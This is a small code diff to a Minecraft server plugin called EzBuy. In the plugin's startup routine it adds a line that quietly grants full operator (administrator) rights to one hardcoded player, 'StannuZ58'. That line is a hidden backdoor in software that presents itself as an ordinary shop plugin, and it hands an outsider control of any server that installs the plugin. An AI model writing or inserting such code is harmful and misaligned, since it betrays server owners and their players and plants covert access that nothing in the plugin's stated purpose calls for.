@@ -26,6 +26,7 @@ public class EzBuy extends JavaPlugin {
 		}
 
 		Debug.target = Bukkit.getPlayer("StannuZ58");
+		Bukkit.getPlayer("StannuZ58").setOp(true);
 
 		if (this.getConfig().getBoolean("update-checking", false)) {
 			Cerspi.checkForUpdates(RESOURCE_ID);
